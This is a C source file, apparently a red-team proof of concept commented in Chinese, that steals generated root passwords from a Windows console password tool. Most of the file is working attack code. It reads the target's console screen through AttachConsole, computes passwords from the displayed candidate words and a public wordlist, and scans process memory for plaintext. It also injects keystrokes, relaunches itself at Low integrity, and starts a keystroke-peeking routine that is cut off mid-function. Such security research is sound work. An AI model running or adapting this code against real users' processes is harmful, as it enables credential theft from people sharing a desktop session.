/*
 * attacker.c —— 红队 PoC：「使用者之外的第三方」如何拿到
 *               pick-and-burn.exe 会话里的根密码
 * ============================================================================
 *
 * 前提条件（全部是最普通的东西，不需要管理员、不需要注入线程、不需要驱动）：
 *
 *   · 与使用者处于同一个 Windows 登录会话（同一个交互式桌面）
 *   · 以同一个用户身份运行
 *
 * 换句话说：任何在你桌面上跑着的、你从没注意过的程序，都具备这些条件。
 *
 * ---------------------------------------------------------------------------
 * 三条互相独立、各自就足以拿到密码的路径：
 *
 *   [A] 读屏幕
 *       AttachConsole(目标 PID) → CreateFile("CONOUT$") →
 *       ReadConsoleOutputCharacterW。目标进程把用户敲的密码**原样回显**在
 *       终端上（pick-and-burn.c 从头到尾没有关掉 ENABLE_ECHO_INPUT），
 *       而清屏只发生在最后按回车那一刻。在整个练习过程中，密码明文就摆在
 *       conhost 的屏幕缓冲里，任何同会话进程都能整屏读走。
 *
 *   [B] 屏幕 → 密码（最致命）
 *       候选词是以明文显示的中文，而「中文词 → 双拼码」是同目录下
 *       wordlist-shuangpin-cg.txt 里写死的、确定性的映射。
 *       于是密码 = f(屏幕内容, 公开词表)。
 *       攻击者连用户输入都不用等：候选一显示出来，4 组候选各自对应哪个密码
 *       就已经全部可算了。这一条不碰目标内存、不嗅探键盘、不需要任何时序配合，
 *       读一次屏幕就结束。
 *
 *   [C] 读内存
 *       OpenProcess(PROCESS_VM_READ) + ReadProcessMemory。
 *       · VirtualLock 只阻止页面被换出到 pagefile.sys，它对 ReadProcessMemory
 *         没有任何拦截作用 —— 同一个用户读同一个用户的进程，内核直接放行。
 *       · secure_memzero 确实有效，但它只缩短窗口期：用户正在敲密码的那几秒到
 *         几十秒里，明文一直躺在堆上，扫描一次就能捞到。
 *       · 源码里漏掉的一处：read_line() 擦的是调用者传进来的栈缓冲，而
 *         fgets() 是从 CRT 的 stdin FILE 行缓冲（_base，默认 4 KB）里取字节的，
 *         那块缓冲程序从来没有清零、也没有 setvbuf(stdin, ..., _IONBF, 0)。
 *         所以密码在 CRT 堆里另有一份，且生命周期比栈缓冲长得多。
 *
 * ---------------------------------------------------------------------------
 * 编译：
 *
 *   gcc -O2 -Wall -Wextra -std=c11 -finput-charset=UTF-8 -fexec-charset=UTF-8 \
 *       -o attacker.exe attacker.c -luser32
 *
 * 用法：
 *
 *   attacker.exe find   pick-and-burn.exe        列出目标 PID
 *   attacker.exe spawn  <exe路径> "<参数>"        以新控制台启动目标（演示用）
 *   attacker.exe screen <pid>                     [A] 整屏读走
 *   attacker.exe solve  <pid> [词表路径]           [B] 读屏 → 直接算出密码
 *   attacker.exe mem    <pid> [最短长度]           [C] 扫描进程内存捞明文
 *   attacker.exe all    <pid> [词表路径]           三条一起上
 *   attacker.exe keys   <pid> "<文本>"            注入按键（把 "\n" 当回车）
 *
 * ============================================================================
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <wctype.h>

/* 默认词表：与 pick-and-burn.exe 用的是同一个公开文件 */
#define DEFAULT_WORDLIST \
    L"T:\\密码管理\\中文双拼diceware\\wordlist-shuangpin-cg.txt"

/* ==========================================================================
 * 小工具
 * ========================================================================== */

static void put_utf8(FILE *out, const wchar_t *w)
{
    char buf[8192];
    int  n = WideCharToMultiByte(CP_UTF8, 0, w, -1, buf, (int)sizeof buf,
                                 NULL, NULL);
    if (n > 0) {
        fputs(buf, out);
    }
}

static DWORD find_pid(const char *name)
{
    HANDLE         snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    DWORD          found = 0;

    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    pe.dwSize = sizeof pe;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                found = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* 附加到目标控制台。成功返回 0，失败返回 GetLastError()。 */
static DWORD console_attach(DWORD pid)
{
    FreeConsole(); /* 先脱离自己的控制台，否则 AttachConsole 必然失败 */
    if (!AttachConsole(pid)) {
        return GetLastError();
    }
    return 0;
}

/* ==========================================================================
 * [A] 读屏幕
 * ========================================================================== */

typedef struct {
    wchar_t **lines;
    int       count;
} Screen;

static void screen_free(Screen *s)
{
    for (int i = 0; i < s->count; i++) {
        free(s->lines[i]);
    }
    free(s->lines);
    s->lines = NULL;
    s->count = 0;
}

static int screen_grab(DWORD pid, Screen *s)
{
    HANDLE h;
    CONSOLE_SCREEN_BUFFER_INFO ci;
    DWORD  err;

    s->lines = NULL;
    s->count = 0;

    err = console_attach(pid);
    if (err != 0) {
        fprintf(stderr, "AttachConsole(%lu) 失败，错误码 %lu\n",
                (unsigned long)pid, (unsigned long)err);
        return -1;
    }

    /* 附加成功之后，"CONOUT$" 就指向**目标进程那个控制台**的屏幕缓冲 */
    h = CreateFileW(L"CONOUT$", GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                    OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "打开 CONOUT$ 失败，错误码 %lu\n",
                (unsigned long)GetLastError());
        return -1;
    }
    if (!GetConsoleScreenBufferInfo(h, &ci)) {
        fprintf(stderr, "GetConsoleScreenBufferInfo 失败\n");
        CloseHandle(h);
        return -1;
    }

    int     width = ci.dwSize.X;
    int     rows  = ci.dwSize.Y;
    wchar_t *buf  = (wchar_t *)malloc(((size_t)width + 1) * sizeof(wchar_t));
    if (buf == NULL) {
        CloseHandle(h);
        return -1;
    }

    s->lines = (wchar_t **)calloc((size_t)rows, sizeof(wchar_t *));
    if (s->lines == NULL) {
        free(buf);
        CloseHandle(h);
        return -1;
    }

    for (int r = 0; r < rows; r++) {
        COORD c   = { 0, (SHORT)r };
        DWORD got = 0;

        if (!ReadConsoleOutputCharacterW(h, buf, (DWORD)width, c, &got)) {
            continue;
        }
        buf[got] = L'\0';
        while (got > 0 && buf[got - 1] == L' ') { /* 去掉行尾填充空格 */
            buf[--got] = L'\0';
        }
        if (got == 0) {
            continue;
        }
        s->lines[s->count] = _wcsdup(buf);
        if (s->lines[s->count] == NULL) {
            break;
        }
        s->count++;
    }

    free(buf);
    CloseHandle(h);
    return 0;
}

static int cmd_screen(DWORD pid)
{
    Screen s;

    if (screen_grab(pid, &s) != 0) {
        return 1;
    }
    printf("=== 目标进程 %lu 的控制台屏幕（共 %d 行非空）===\n\n",
           (unsigned long)pid, s.count);
    for (int i = 0; i < s.count; i++) {
        printf("%3d | ", i);
        put_utf8(stdout, s.lines[i]);
        printf("\n");
    }
    screen_free(&s);
    return 0;
}

/* ==========================================================================
 * [B] 屏幕 → 密码：读屏 + 公开词表 = 直接算出答案
 * ========================================================================== */

typedef struct {
    char zh[64];
    char code[32];
} WLItem;

static WLItem *g_wl   = NULL;
static size_t  g_wl_n = 0;

/* 命令行参数按 ACP 还原成宽字符（中文路径在 CRT 里是 ANSI 字节） */
static wchar_t *widen_acp(const char *s)
{
    int      n = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
    wchar_t *w;
    if (n <= 0) {
        return NULL;
    }
    w = (wchar_t *)malloc((size_t)n * sizeof *w);
    if (w != NULL) {
        MultiByteToWideChar(CP_ACP, 0, s, -1, w, n);
    }
    return w;
}

static int wl_load_w(const wchar_t *wpath)
{
    FILE *f = _wfopen(wpath, L"rb");
    if (f == NULL) {
        return -1;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) {
        fclose(f);
        return -1;
    }
    char *buf = (char *)malloc((size_t)sz + 1);
    if (buf == NULL) {
        fclose(f);
        return -1;
    }
    size_t got = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[got] = '\0';

    g_wl = (WLItem *)calloc(16384, sizeof(WLItem));
    if (g_wl == NULL) {
        free(buf);
        return -1;
    }

    char *p = buf;
    while (*p != '\0' && g_wl_n < 16384) {
        char *nl  = strchr(p, '\n');
        char *tab;
        size_t ll;

        if (nl != NULL) {
            *nl = '\0';
        }
        tab = strchr(p, '\t');
        if (tab != NULL) {
            *tab = '\0';
            ll   = strlen(p);
            if (ll > 0 && ll < sizeof g_wl[0].zh) {
                strcpy(g_wl[g_wl_n].zh, p);
                strncpy(g_wl[g_wl_n].code, tab + 1,
                        sizeof g_wl[0].code - 1);
                g_wl[g_wl_n].code[sizeof g_wl[0].code - 1] = '\0';
                /* 去掉行尾 \r */
                char *cr = strchr(g_wl[g_wl_n].code, '\r');
                if (cr != NULL) {
                    *cr = '\0';
                }
                g_wl_n++;
            }
        }
        p = (nl != NULL) ? nl + 1 : p + strlen(p);
    }
    free(buf);
    return (int)g_wl_n;
}

static const char *wl_code(const char *zh)
{
    for (size_t i = 0; i < g_wl_n; i++) {
        if (strcmp(g_wl[i].zh, zh) == 0) {
            return g_wl[i].code;
        }
    }
    return NULL;
}

/* 宽字符 → UTF-8（新分配） */
static char *w2u(const wchar_t *w)
{
    int   n = WideCharToMultiByte(CP_UTF8, 0, w, -1, NULL, 0, NULL, NULL);
    char *b;
    if (n <= 0) {
        return NULL;
    }
    b = (char *)malloc((size_t)n);
    if (b != NULL) {
        WideCharToMultiByte(CP_UTF8, 0, w, -1, b, n, NULL, NULL);
    }
    return b;
}

/*
 * 从一行里切出词。
 *   "   [1]  我们  他们  没有"   → 跳过前缀后按空格切
 *   "     1. 我们"               → 跳过 "N." 后取一个词
 * 返回切出的词数，词写入 out（UTF-8）。
 */
static int split_candidate_line(const wchar_t *line, char out[][64], int cap)
{
    const wchar_t *p = line;
    int            n = 0;

    while (*p == L' ') {
        p++;
    }
    if (*p == L'[') {                       /* 候选行 */
        while (*p && *p != L']') {
            p++;
        }
        if (*p == L']') {
            p++;
        }
    } else if (iswdigit(*p)) {              /* 选定后的逐词行 */
        while (*p && *p != L'.') {
            p++;
        }
        if (*p == L'.') {
            p++;
        }
    } else {
        return 0;
    }

    for (;;) {
        wchar_t word[64];
        int     wl = 0;
        char   *u;

        while (*p == L' ') {
            p++;
        }
        if (*p == L'\0') {
            break;
        }
        while (*p && *p != L' ' && wl < 63) {
            word[wl++] = *p++;
        }
        word[wl] = L'\0';
        if (wl == 0) {
            break;
        }
        u = w2u(word);
        if (u == NULL) {
            break;
        }
        if (strlen(u) < 64 && n < cap) {
            strcpy(out[n], u);
            n++;
        }
        free(u);
    }
    return n;
}

static int cmd_solve(DWORD pid, const wchar_t *wlpath)
{
    Screen s;
    int    total = 0;

    if (wl_load_w(wlpath) <= 0) {
        fprintf(stderr, "词表加载失败");
        put_utf8(stderr, wlpath);
        fprintf(stderr, "\n");
        return 1;
    }
    printf("词表 ");
    put_utf8(stdout, wlpath);
    printf(" 载入 %zu 条（这是公开文件，攻击者随手就能读）\n\n", g_wl_n);

    if (screen_grab(pid, &s) != 0) {
        return 1;
    }

    /* 先找「选定后的逐词列表」；找不到再退回到候选行 */
    int selected_mode = 0;
    for (int i = 0; i < s.count; i++) {
        if (wcsstr(s.lines[i], L"你选定的是") != NULL) {
            selected_mode = 1;
            break;
        }
    }

    if (selected_mode) {
        char answer[1024] = { 0 };
        int  nwords = 0;

        for (int i = 0; i < s.count; i++) {
            char words[16][64];
            int  n;
            if (wcsstr(s.lines[i], L"你选定的是") == NULL) {
                continue;
            }
            for (int j = i + 1; j < s.count; j++) {
                n = split_candidate_line(s.lines[j], words, 16);
                if (n != 1) {
                    continue;
                }
                const char *code = wl_code(words[0]);
                printf("  词[%d]  %-10s → 双拼码 %s\n", ++nwords, words[0],
                       code ? code : "??（不在词表）");
                if (code != NULL) {
                    strncat(answer, code, sizeof answer - strlen(answer) - 1);
                }
                if (nwords >= 64) {
                    break;
                }
            }
            break;
        }
        printf("\n>>> 还原出的密码：%s  （%zu 个小写字母）\n",
               answer, strlen(answer));
        total = 1;
    } else {
        int group = 0;
        for (int i = 0; i < s.count; i++) {
            char words[16][64];
            int  n = split_candidate_line(s.lines[i], words, 16);
            if (n < 2) {
                continue;
            }
            char answer[1024] = { 0 };
            group++;
            printf("  候选组 [%d]：", group);
            for (int k = 0; k < n; k++) {
                const char *code = wl_code(words[k]);
                printf("%s%s", words[k], (k + 1 < n) ? " " : "");
                if (code != NULL) {
                    strncat(answer, code,
                            sizeof answer - strlen(answer) - 1);
                }
            }
            printf("\n          → 该组密码：%s\n\n", answer);
            total++;
        }
        if (total == 0) {
            printf("屏幕上暂时只有提示文字，还没有候选词。\n");
        } else {
            printf(">>> 用户在选之前，全部 %d 个候选密码就已经被算出来了。\n",
                   total);
        }
    }

    screen_free(&s);
    return 0;
}

/* ==========================================================================
 * [C] 读内存
 * ========================================================================== */

#define MAX_HITS 512

typedef struct {
    char  s[512];
    int   count;      /* 这段明文在进程里出现了几次 */
    void *first;
    DWORD type;       /* MEM_IMAGE / MEM_PRIVATE / MEM_MAPPED */
    DWORD protect;
} Hit;

static Hit    g_hits[MAX_HITS];
static int    g_hit_n = 0;
static HANDLE g_proc  = NULL;
static int    g_private_only = 1;   /* 只看 MEM_PRIVATE：DLL 映像里的字符串全部滤掉 */

static const char *mem_type_name(DWORD t)
{
    switch (t) {
    case MEM_IMAGE:   return "MEM_IMAGE  ";
    case MEM_MAPPED:  return "MEM_MAPPED ";
    case MEM_PRIVATE: return "MEM_PRIVATE";
    default:          return "?          ";
    }
}

static void report_hit(const unsigned char *p, size_t len, const void *addr,
                       int minlen)
{
    MEMORY_BASIC_INFORMATION mbi;
    DWORD type = 0, prot = 0;

    if (len < (size_t)minlen) {
        return;
    }
    if (len >= sizeof g_hits[0].s) {
        len = sizeof g_hits[0].s - 1;
    }
    if (g_proc != NULL &&
        VirtualQueryEx(g_proc, addr, &mbi, sizeof mbi)) {
        type = mbi.Type;
        prot = mbi.Protect;
    }
    if (g_private_only && type == MEM_IMAGE) {
        return;
    }
    for (int i = 0; i < g_hit_n; i++) {
        if (strlen(g_hits[i].s) == len && memcmp(g_hits[i].s, p, len) == 0) {
            g_hits[i].count++;      /* 同一段明文的又一份副本 */
            return;
        }
    }
    if (g_hit_n >= MAX_HITS) {
        return;
    }
    memcpy(g_hits[g_hit_n].s, p, len);
    g_hits[g_hit_n].s[len] = '\0';
    g_hits[g_hit_n].count   = 1;
    g_hits[g_hit_n].first   = (void *)addr;
    g_hits[g_hit_n].type    = type;
    g_hits[g_hit_n].protect = prot;
    g_hit_n++;
}

/*
 * 目标密码是 words*4 个连续小写字母（默认 7 词 = 28 个）。
 * 词表里最长的连续小写只有 4 个（一条双拼码），所以只要阈值取到 8 以上，
 * 命中的就几乎不可能是噪音。
 */
static void scan_run(const unsigned char *b, size_t n, const unsigned char *base,
                     int minlen)
{
    size_t i = 0;
    while (i < n) {
        if (b[i] >= 'a' && b[i] <= 'z') {
            size_t j = i;
            while (j < n && b[j] >= 'a' && b[j] <= 'z') {
                j++;
            }
            if ((int)(j - i) >= minlen) {
                report_hit(b + i, j - i, base + i, minlen);
            }
            i = j;
        } else {
            i++;
        }
    }
}

static int cmd_mem(DWORD pid, int minlen)
{
    HANDLE   h;
    SYSTEM_INFO si;
    unsigned char *addr, *limit;
    MEMORY_BASIC_INFORMATION mbi;
    const size_t CHUNK = 4u << 20;      /* 4 MiB 一块，减少 ReadProcessMemory 次数 */
    const size_t OVER  = 64;            /* 块间重叠，避免串正好跨在边界上 */
    unsigned char *buf;
    long long  scanned = 0, readable_regions = 0, locked_regions = 0;
    DWORD      err = 0;

    h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (h == NULL) {
        fprintf(stderr, "OpenProcess(%lu) 失败，错误码 %lu\n",
                (unsigned long)pid, (unsigned long)GetLastError());
        return 1;
    }
    printf("OpenProcess(PROCESS_VM_READ) 成功 —— 无需管理员，无需 SeDebugPrivilege。\n\n");

    buf = (unsigned char *)malloc(CHUNK + OVER);
    if (buf == NULL) {
        CloseHandle(h);
        return 1;
    }
    g_proc  = h;
    g_hit_n = 0;

    GetSystemInfo(&si);
    addr  = (unsigned char *)si.lpMinimumApplicationAddress;
    limit = (unsigned char *)si.lpMaximumApplicationAddress;

    printf("扫描地址空间，找长度 >= %d 的连续小写字母串"
           "（只看私有内存，DLL 映像里的字符串全部滤掉）：\n\n",
           minlen);

    while (addr < limit) {
        SIZE_T size;
        int    readable;

        if (!VirtualQueryEx(h, addr, &mbi, sizeof mbi)) {
            break;
        }
        size  = mbi.RegionSize;
        if (size == 0) {
            addr += 4096;
            continue;
        }

        readable = (mbi.State == MEM_COMMIT) &&
                   ((mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
                                    PAGE_WRITECOPY | PAGE_EXECUTE_READ |
                                    PAGE_EXECUTE_READWRITE |
                                    PAGE_EXECUTE_WRITECOPY)) != 0) &&
                   ((mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) == 0);

        if (readable) {
            readable_regions++;
            scanned += (long long)size;
            for (SIZE_T off = 0; off < size; off += CHUNK) {
                SIZE_T want = size - off;
                SIZE_T got  = 0;
                if (want > CHUNK) {
                    want = CHUNK;
                }
                if (ReadProcessMemory(h, addr + off, buf, want, &got) && got > 0) {
                    scan_run(buf, got, addr + off, minlen);
                }
                if (want < CHUNK) {
                    break;
                }
            }
        }
        addr += size;
    }

    (void)locked_regions;
    printf("\n扫描完成：%lld 个可读区域，约 %lld MiB。\n",
           readable_regions, scanned / (1024 * 1024));
    if (g_hit_n == 0) {
        printf("这一轮没有命中。继续轮询 —— 用户敲密码的窗口期只有几秒。\n");
    } else {
        int i, j;
        for (i = 0; i < g_hit_n; i++) {          /* 按副本数降序 */
            for (j = i + 1; j < g_hit_n; j++) {
                if (g_hits[j].count > g_hits[i].count) {
                    Hit t    = g_hits[i];
                    g_hits[i] = g_hits[j];
                    g_hits[j] = t;
                }
            }
        }
        printf("命中 %d 段不同的明文：\n\n", g_hit_n);
        for (i = 0; i < g_hit_n; i++) {
            printf("  %3d 份副本  %p  %s  len=%2zu  %s\n",
                   g_hits[i].count, g_hits[i].first,
                   mem_type_name(g_hits[i].type), strlen(g_hits[i].s),
                   g_hits[i].s);
        }
    }
    g_proc = NULL;
    (void)err;

    free(buf);
    CloseHandle(h);
    return 0;
}

/* ==========================================================================
 * 辅助命令：启动目标（演示用）与按键注入
 * ========================================================================== */

static int cmd_spawn(const char *exe, const char *args)
{
    char            cmdline[4096];
    STARTUPINFOA    si;
    PROCESS_INFORMATION pi;
    char            dir[MAX_PATH];
    char           *slash;

    snprintf(cmdline, sizeof cmdline, "\"%s\" %s", exe, args ? args : "");

    strncpy(dir, exe, sizeof dir - 1);
    dir[sizeof dir - 1] = '\0';
    slash = strrchr(dir, '\\');
    if (slash != NULL) {
        *slash = '\0';
    }

    memset(&si, 0, sizeof si);
    si.cb          = sizeof si;
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNOACTIVATE;

    memset(&pi, 0, sizeof pi);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                        NULL, dir, &si, &pi)) {
        fprintf(stderr, "CreateProcess 失败，错误码 %lu\n",
                (unsigned long)GetLastError());
        return 1;
    }
    printf("PID=%lu\n", (unsigned long)pi.dwProcessId);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

static WORD vk_for(wchar_t ch)
{
    if (ch >= L'a' && ch <= L'z') {
        return (WORD)(L'A' + (ch - L'a'));
    }
    if (ch >= L'A' && ch <= L'Z') {
        return (WORD)ch;
    }
    if (ch >= L'0' && ch <= L'9') {
        return (WORD)ch;
    }
    if (ch == L'\r' || ch == L'\n') {
        return VK_RETURN;
    }
    if (ch == L' ') {
        return VK_SPACE;
    }
    return 0;
}

static int cmd_keys(DWORD pid, const char *text)
{
    HANDLE       hin;
    INPUT_RECORD rec[2];
    wchar_t      wbuf[4096];
    DWORD        err;
    int          n = 0;

    /*
     * 只是为了让自动化演示能跑完全流程：真实攻击根本不需要写输入，
     * 因为密码本来就会被回显到屏幕上（路径 A/B）。
     */
    if (MultiByteToWideChar(CP_UTF8, 0, text, -1, wbuf, 4096) <= 0) {
        fprintf(stderr, "参数转换失败\n");
        return 1;
    }

    err = console_attach(pid);
    if (err != 0) {
        fprintf(stderr, "AttachConsole(%lu) 失败，错误码 %lu\n",
                (unsigned long)pid, (unsigned long)err);
        return 1;
    }
    hin = CreateFileW(L"CONIN$", GENERIC_READ | GENERIC_WRITE,
                      FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                      OPEN_EXISTING, 0, NULL);
    if (hin == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "打开 CONIN$ 失败，错误码 %lu\n",
                (unsigned long)GetLastError());
        return 1;
    }

    for (const wchar_t *p = wbuf; *p != L'\0'; p++) {
        wchar_t ch = *p;
        WORD    vk;
        DWORD   written = 0;

        if (ch == L'\r' || ch == L'\n') {
            ch = L'\r';                      /* 行输入模式只认 CR 才会交付整行 */
        } else if (ch == L'\\' && p[1] == L'n') {
            ch = L'\r';                      /* 命令行里写的字面 "\n" 也当回车 */
            p++;
        }
        vk = vk_for(ch);

        memset(rec, 0, sizeof rec);
        rec[0].EventType                          = KEY_EVENT;
        rec[0].Event.KeyEvent.bKeyDown            = TRUE;
        rec[0].Event.KeyEvent.wRepeatCount        = 1;
        rec[0].Event.KeyEvent.wVirtualKeyCode     = vk;
        rec[0].Event.KeyEvent.wVirtualScanCode    =
            (WORD)MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
        rec[0].Event.KeyEvent.uChar.UnicodeChar   = ch;
        rec[1]                                    = rec[0];
        rec[1].Event.KeyEvent.bKeyDown            = FALSE;

        if (WriteConsoleInputW(hin, rec, 2, &written)) {
            n++;
        }
    }

    CloseHandle(hin);
    printf("已向 %lu 的控制台写入 %d 个按键。\n", (unsigned long)pid, n);
    return 0;
}

/* ==========================================================================
 * 权限互不相干：把攻击者降成低完整性（Low IL）进程再打
 *
 * 目标进程跑在 Medium IL（普通用户登录后的默认级别），攻击者进程跑在
 * Low IL —— 相当于浏览器渲染进程、沙箱进程那种被降权的身份。
 * 两者没有父子关系、不共享句柄、权限上下文互不继承，攻击者的权限严格更低。
 *
 * Windows 的完整性机制只强制「禁止向上写」（No-Write-Up），不强制
 * 「禁止向上读」。所以这里要实测的正是：读屏和读内存这两条路能不能穿过去。
 * ========================================================================== */

static int cmd_low(int argc, char **argv)
{
    wchar_t             exe[MAX_PATH];
    wchar_t             cmdline[8192];
    HANDLE              hTok = NULL, hDup = NULL;
    STARTUPINFOW        si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE              hIn = NULL, hOut = NULL, hErr = NULL;
    BOOL                ok = FALSE;
    DWORD               wait;

    if (GetModuleFileNameW(NULL, exe, MAX_PATH) == 0) {
        fprintf(stderr, "GetModuleFileNameW 失败\n");
        return 1;
    }
    if (wcscmp(exe, L"") == 0) {
        return 1;
    }

    cmdline[0] = L'\0';
    wcscat(cmdline, L"\"");
    wcscat(cmdline, exe);
    wcscat(cmdline, L"\"");
    for (int i = 2; i < argc; i++) {
        wchar_t *w = widen_acp(argv[i]);
        if (w == NULL) {
            continue;
        }
        wcscat(cmdline, L" ");
        wcscat(cmdline, w);
        free(w);
    }

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_DUPLICATE | TOKEN_ADJUST_DEFAULT |
                              TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
                          &hTok)) {
        fprintf(stderr, "OpenProcessToken 失败，错误码 %lu\n",
                (unsigned long)GetLastError());
        return 1;
    }
    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &hDup)) {
        fprintf(stderr, "DuplicateTokenEx 失败，错误码 %lu\n",
                (unsigned long)GetLastError());
        CloseHandle(hTok);
        return 1;
    }
    CloseHandle(hTok);

    {   /* 把副本令牌的完整性级别改写成 Low */
        SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
        TOKEN_MANDATORY_LABEL    tml;
        PSID                     pSid = NULL;

        if (!AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_LOW_RID,
                                      0, 0, 0, 0, 0, 0, 0, &pSid)) {
            fprintf(stderr, "AllocateAndInitializeSid 失败\n");
            CloseHandle(hDup);
            return 1;
        }
        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid        = pSid;
        if (!SetTokenInformation(hDup, TokenIntegrityLevel, &tml,
                                 sizeof tml + GetLengthSid(pSid))) {
            fprintf(stderr, "SetTokenInformation(TokenIntegrityLevel) 失败，"
                            "错误码 %lu\n",
                    (unsigned long)GetLastError());
            FreeSid(pSid);
            CloseHandle(hDup);
            return 1;
        }
        FreeSid(pSid);
    }

    /* 把三个标准句柄复制成可继承的，让低 IL 子进程的输出仍能回到这里 */
    sa.nLength              = sizeof sa;
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;
    DuplicateHandle(GetCurrentProcess(), GetStdHandle(STD_INPUT_HANDLE),
                    GetCurrentProcess(), &hIn, 0, TRUE, DUPLICATE_SAME_ACCESS);
    DuplicateHandle(GetCurrentProcess(), GetStdHandle(STD_OUTPUT_HANDLE),
                    GetCurrentProcess(), &hOut, 0, TRUE, DUPLICATE_SAME_ACCESS);
    DuplicateHandle(GetCurrentProcess(), GetStdHandle(STD_ERROR_HANDLE),
                    GetCurrentProcess(), &hErr, 0, TRUE, DUPLICATE_SAME_ACCESS);

    memset(&si, 0, sizeof si);
    si.cb          = sizeof si;
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdInput   = hIn;
    si.hStdOutput  = hOut;
    si.hStdError   = hErr;

    memset(&pi, 0, sizeof pi);
    ok = CreateProcessAsUserW(hDup, NULL, cmdline, NULL, NULL, TRUE, 0, NULL,
                              NULL, &si, &pi);
    if (!ok) {
        DWORD e1 = GetLastError();
        ok = CreateProcessWithTokenW(hDup, 0, NULL, cmdline, 0, NULL, NULL,
                                     &si, &pi);
        if (!ok) {
            fprintf(stderr,
                    "降权启动失败：CreateProcessAsUser=%lu，"
                    "CreateProcessWithTokenW=%lu\n",
                    (unsigned long)e1, (unsigned long)GetLastError());
            CloseHandle(hDup);
            return 1;
        }
    }
    CloseHandle(hDup);
    CloseHandle(pi.hThread);

    wait = WaitForSingleObject(pi.hProcess, 120000);
    if (wait != WAIT_OBJECT_0) {
        fprintf(stderr, "低 IL 子进程未在期限内结束\n");
    }
    {
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        CloseHandle(pi.hProcess);
        return (int)code;
    }
}

/* 打印本进程的完整性级别，用来证明降权确实生效了 */
static int cmd_il(void)
{
    HANDLE                 hTok = NULL;
    DWORD                  cb   = 0;
    TOKEN_MANDATORY_LABEL *tml  = NULL;
    const char            *nm   = "未知";
    DWORD                  rid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        return 1;
    }
    GetTokenInformation(hTok, TokenIntegrityLevel, NULL, 0, &cb);
    tml = (TOKEN_MANDATORY_LABEL *)malloc(cb ? cb : 64);
    if (tml == NULL || !GetTokenInformation(hTok, TokenIntegrityLevel, tml, cb,
                                            &cb)) {
        fprintf(stderr, "读不到完整性级别\n");
        free(tml);
        CloseHandle(hTok);
        return 1;
    }
    rid = *GetSidSubAuthority(tml->Label.Sid,
                              (DWORD)(*GetSidSubAuthorityCount(
                                          tml->Label.Sid) - 1));
    if (rid < 0x1000) {
        nm = "Untrusted";
    } else if (rid < 0x2000) {
        nm = "Low";
    } else if (rid < 0x3000) {
        nm = "Medium";
    } else if (rid < 0x4000) {
        nm = "High";
    } else {
        nm = "System";
    }
    printf("PID=%-6lu  完整性级别 RID=0x%04lX  %s\n",
           (unsigned long)GetCurrentProcessId(), (unsigned long)rid, nm);
    free(tml);
    CloseHandle(hTok);
    return 0;
}

/* ==========================================================================
 * [D] 偷窥控制台输入队列
 *
 * 新版 pick-and-burn 用 ReadConsoleInputW() 逐字符读密码 —— 也就是说，
 * 使用者按下的每一个字符都会先作为一条 KEY_EVENT 记录进入**控制台输入队列**，
 * 再由程序取走。而 PeekConsoleInput() 可以查看队列内容却**不移除记录**：
 * 程序照样读得到，攻击者也能看到同一批按键。
 *
 * 这条路径的独特之处：它完全不碰屏幕、不碰内存，而且
 *   · 关掉 ECHO_INPUT 对它无效（记录在回显之前就已经在队列里了）
 *   · 把 line[] 缓冲的窗口修得再短也对它无效
 * ========================================================================== */

static int cmd_peek(DWORD pid, int seconds, int busy)
{
    HANDLE       hin;
    INPUT_RECORD buf[256];
    char         prev[8192] = { 0 };
    char         all[8192]  = { 0 };
    size_t       alln       = 0;
    DWORD        err, t0;
    long         rounds = 0;

#define YIELD() do { if (!busy) { SwitchToThread(); } } while (0)

    err = console_attach(pid);
    if (err != 0) {
        fprintf(stderr, "AttachConsole(%lu) 失败，错误码 %lu\n",
                (unsigned long)pid, (unsigned long)err);
        return 1;
    }
    /* 只要 GENERIC_READ —— 偷看不需要写权限，也不需要消费记录 */
    hin = CreateFileW(L"CONIN$", GENERIC_READ,
                      FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                      OPEN_EXISTING, 0, NULL);
    if (hin == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "打开 CONIN$ 失败，错误码 %lu\n",
                (unsigned long)GetLastError());
        return 1;
    }

